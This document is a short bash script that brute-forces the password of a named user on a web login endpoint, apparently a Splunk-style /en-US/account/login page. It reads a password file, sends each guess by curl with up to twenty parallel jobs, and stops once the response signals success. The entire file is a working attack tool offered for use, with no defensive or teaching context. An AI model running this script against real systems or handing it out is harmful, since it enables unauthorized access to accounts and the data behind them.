#!/bin/bash

if [ "$1" == "" ]
then
	echo "FAILED"
	echo "USAGE: $0 [user] [passfile] [host] [port]"
	exit
fi
USR=$1
PWDF=$2
HST=$3
PRT=$4
export SCRIPT_NAME=`echo $0 | sed 's/.\///g'`
echo
echo "[!] Bruteforcing password for $USR on $HST..."

function fuzz {
RESP=$(curl -s http://${HST}:${PRT}/en-US/account/login -d "cval=1358221314&username=$USR&password=$1&set_has_logged_in=false")
if [[ $RESP == *"{\"status\":2}"* ]]
then
	echo
	echo "SUCCESS! U: $USR P: $1"
	echo
	killall $SCRIPT_NAME 2>&1 >/dev/null
fi
printf '.'
}
cat "$PWDF" | while read PASS
do
	while [ `jobs | wc -l ` -ge 20 ]
	do
		sleep 1
	done
	fuzz $PASS &  
done

